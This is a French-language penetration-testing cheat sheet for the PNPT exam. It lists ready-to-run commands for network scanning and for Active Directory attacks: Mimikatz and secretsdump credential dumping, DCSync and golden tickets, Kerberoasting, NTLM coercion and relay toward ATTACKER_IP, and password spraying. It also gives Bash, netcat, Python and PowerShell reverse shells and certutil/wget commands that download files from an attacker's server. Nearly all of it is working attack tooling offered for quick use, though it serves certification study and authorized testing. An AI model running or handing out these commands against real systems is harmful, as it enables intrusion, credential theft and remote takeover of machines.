---
title: "Cheat Sheet — Commandes essentielles (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, cheatsheet, pnpt]
date: "2026-05-18"
---

# Cheat Sheet — Commandes essentielles

Référence rapide à consulter pendant l'examen ou un engagement. Pas d'explications ici — voir les notes thématiques (01–20) pour le contexte et la pédagogie. Cette page existe pour le coup d'œil sous pression : "comment je lance Kerberoasting déjà ?".

## Nmap

```bash
nmap -sC -sV -oN scan.txt IP              # standard
nmap -T4 -p- IP                            # tous les ports
nmap -sU --top-ports 20 IP                 # UDP
nmap --script=vuln IP                      # scan vuln
nmap -Pn -sS -T4 -p- IP                    # externe (skip ICMP)
```

## Énumération web

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dns -d cible.com -w wordlist.txt
gobuster vhost -u http://IP -w wordlist.txt
feroxbuster -u http://IP -d 3
ffuf -u http://IP/FUZZ -w wordlist
nuclei -severity critical,high -u http://cible.com
```

## CrackMapExec / NetExec

```bash
crackmapexec smb IP -u user -p pass
crackmapexec smb IP -u user -H HASH
crackmapexec smb IP -u user -p pass --shares
crackmapexec smb IP -u user -p pass --sam
crackmapexec smb IP -u user -p pass -M spider_plus
crackmapexec winrm IP -u user -p pass
crackmapexec ldap DC_IP -u user -p pass --kerberoasting hashes.txt
crackmapexec mssql IP -u user -p pass -x "whoami"
```

## Impacket

```bash
psexec.py cible.com/user:pass@IP
wmiexec.py cible.com/user:pass@IP
smbexec.py cible.com/user:pass@IP
secretsdump.py cible.com/user:pass@IP
GetUserSPNs.py cible.com/user:pass -dc-ip DC_IP -request
GetNPUsers.py cible.com/ -usersfile users.txt -dc-ip DC_IP -no-pass
ntlmrelayx.py -tf targets.txt -smb2support
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' cible.com/user:pass
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write cible.com/user:pass
getST.py -spn cifs/target.cible.com -impersonate Administrator 'cible.com/EVIL$:P@ss'
```

## Evil-WinRM

```bash
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H NTHASH
```

## Hydra

```bash
hydra -l user -P wordlist ssh://IP
hydra -l user -P wordlist ftp://IP
hydra -l admin -P wordlist http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Hashcat

```bash
hashcat -m 0     hash wordlist        # MD5
hashcat -m 100   hash wordlist        # SHA1
hashcat -m 1000  hash wordlist        # NTLM
hashcat -m 1800  hash wordlist        # sha512crypt (Linux /etc/shadow)
hashcat -m 5600  hash wordlist        # NetNTLMv2 (Responder)
hashcat -m 13100 hash wordlist        # Kerberoast (TGS-REP RC4)
hashcat -m 19700 hash wordlist        # Kerberoast (TGS-REP AES256)
hashcat -m 18200 hash wordlist        # AS-REP Roast
hashcat -m 16500 hash wordlist        # JWT (HS256)
```

## Responder

```bash
responder -I eth0 -dwPv
```

## Mimikatz

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::sam
lsadump::lsa /patch
lsadump::dcsync /domain:cible.com /user:Administrator
kerberos::golden /user:fakeadmin /domain:cible.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
sekurlsa::pth /user:admin /domain:cible.com /ntlm:HASH /run:cmd.exe
```

## Chisel

```bash
# Serveur (attaquant)
chisel server --reverse -p 8000
# Client (pivot)
chisel client IP:8000 R:1080:socks
chisel client IP:8000 R:8080:10.10.10.5:80
```

## Ligolo-ng

```bash
# Serveur
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Agent (sur le pivot)
./agent -connect IP:11601 -ignore-cert

# Dans proxy : session, ifconfig, puis :
sudo ip route add 10.10.10.0/24 dev ligolo
start
```

## Kerbrute

```bash
kerbrute userenum -d cible.com --dc DC_IP users.txt
kerbrute passwordspray -d cible.com --dc DC_IP users.txt 'P@ssw0rd1'
kerbrute bruteuser -d cible.com --dc DC_IP wordlist.txt user
```

## PowerView

```powershell
. .\PowerView.ps1
Get-NetUser -SPN                                  # Kerberoastables
Get-NetUser -PreauthNotRequired                   # AS-REP roastables
Get-NetGroupMember -GroupName "Domain Admins"
Find-LocalAdminAccess
Get-DomainUser -TrustedToAuth                     # Constrained delegation
Get-DomainComputer -Unconstrained
Get-NetGPO
Invoke-UserHunter
```

## Rubeus

```powershell
Rubeus.exe asktgt /user:user /password:pass /domain:cible.com /ptt
Rubeus.exe asktgt /user:user /rc4:HASH /ptt
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe triage
Rubeus.exe monitor /interval:5
```

## Certipy (AD CS)

```bash
certipy find -u user@cible.com -p pass -dc-ip IP -vulnerable -stdout
certipy req -u user@cible.com -p pass -ca CA_NAME -template VulnTpl -upn administrator@cible.com
certipy auth -pfx administrator.pfx
certipy relay -ca CA_HOST                         # ESC8
certipy template -u user@cible.com -p pass -template TemplateName -save-old   # ESC4
```

## MSSQL

```bash
mssqlclient.py cible.com/user:pass@IP -windows-auth
crackmapexec mssql IP -u user -p pass -x "whoami"
# Une fois connecté
> enable_xp_cmdshell
> xp_cmdshell whoami
> enum_links
> enum_impersonate
> xp_dirtree \\ATTACKER_IP\share         # capture NetNTLMv2
```

## Coercion

```bash
PetitPotam.py -u user -p pass ATTACKER_IP DC_IP
printerbug.py cible.com/user:pass@VICTIM_IP ATTACKER_IP
SpoolSample.exe VICTIM_IP ATTACKER_IP
dfscoerce.py -u user -p pass ATTACKER_IP DC_IP
shadowcoerce.py -u user -p pass ATTACKER_IP DC_IP
```

## ntlmrelayx (combinaisons)

```bash
# Vers SMB
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."

# Vers LDAP (RBCD ou ajout user)
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user attacker

# Vers AD CS Web Enrollment (ESC8)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
```

## Spraying externe

```bash
o365spray --validate --domain cible.com
o365spray --enum -U users.txt --domain cible.com
o365spray --spray -U users.txt -p 'Spring2026!' --domain cible.com --count 1 --lockout 30
kerbrute passwordspray -d cible.com --dc DC_IP users.txt 'Spring2026!'
crackmapexec smb IP -u users.txt -p 'Spring2026!' --continue-on-success
```

## Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Netcat
nc -e /bin/bash IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

## Shell upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200
```

## Transferts de fichiers

```bash
# Serveur HTTP (attaquant)
python3 -m http.server 8000

# Linux cible
wget http://IP:8000/x
curl -O http://IP:8000/x

# Windows cible
certutil -urlcache -f http://IP:8000/x x.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8000/x','C:\Temp\x')"

# SMB share temporaire (attaquant Kali)
impacket-smbserver -smb2support share /tmp/loot
# Côté Windows : copy \\IP\share\x C:\Temp\
```
